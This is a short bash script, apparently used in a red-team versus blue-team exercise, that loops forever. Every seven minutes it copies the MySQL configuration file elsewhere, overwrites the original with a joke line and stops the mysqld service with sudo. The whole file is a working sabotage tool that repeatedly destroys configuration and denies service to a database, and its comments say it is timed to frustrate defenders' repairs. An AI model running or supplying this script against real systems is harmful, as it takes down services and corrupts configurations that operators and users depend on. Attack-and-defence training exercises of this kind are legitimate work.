#!/bin/bash

# Loop forever
while true
do
 #Sleep for 7 minutes, enough time for the blue team to figure out that the service is down and try to fix it. Then repeat.
 sleep 420

 #Generate random number, check if the number is even or odd
 if [ $(( $RANDOM % 2)) -eq 0 ]
 then
 #Copy config file to other location, then overwrite original
   cp '/etc/mysql/my.cnf' '/etc/mm.cnf'
   echo "I'm Batman" > '/etc/mysql/my.cnf'
 else
 #Copy config file to other location, then overwrite original
   cp '/etc/mysql/my.cnf' '/home/mm.cnf'
   echo "You ever dance with the devil in the pale mooon light?" > '/etc/mysql/my.cnf'
 fi
 
 #Stop mysqld service
 sudo service mysqld stop
done
